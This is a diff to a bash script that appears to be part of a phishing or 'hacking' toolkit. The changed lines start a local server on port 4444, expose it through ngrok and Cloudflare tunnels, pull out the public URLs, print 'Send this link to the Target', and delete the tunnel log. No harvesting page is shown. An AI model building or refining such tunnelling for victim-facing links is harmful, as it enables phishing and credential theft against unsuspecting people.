@@ -58,26 +58,27 @@ echo ""
                            sleep 3
 			   echo ""
 			   ./ngrok http 4444 > /dev/null 2>&1 &
-			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+			   nlink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
 			   
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://127.0.0.1:4444 ${GREEN})"
 	{ sleep 1; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
     if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./cloudflared tunnel -url 127.0.0.1:4444 --logfile .cld.log > /dev/null 2>&1 &
+		sleep 2 && termux-chroot ./cloudflared tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
     else
-        sleep 2 && ./cloudflared tunnel -url 127.0.0.1:4444 --logfile .cld.log > /dev/null 2>&1 &
+        sleep 2 && ./cloudflared tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
     fi
 
 	{ sleep 8; clear; }
 	
-	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
+	clink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cld.log")
 			   
 			   
 			   echo ""
                            echo ""
                            echo ""
+			   clear
 echo -e "\e[92m
 SUMAN ©\e[34m
          ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
@@ -108,17 +109,16 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
                            echo ""
                            echo ""
 			   echo ""
-                           echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;36m Share Ngrok Link and Using "
-			   echo ""
 			   echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$cldflr_link                                   
+                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $clink                                   
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://
+                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$nlink
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                            fi
 			   echo ""
+			   rm -rf cld.log
 			   
 			   
 			   
@@ -850,6 +850,7 @@ elif [ $option = 50 ] || [ $option = 050 ]
 		         echo
 		         echo -e "\e[92m[\e[94m!\e[92m]\e[92m Invalid option Try Again !! \e[m "
 		         sleep 2
+			 rm -rf cld.log
                          exit
 		         fi
                          done
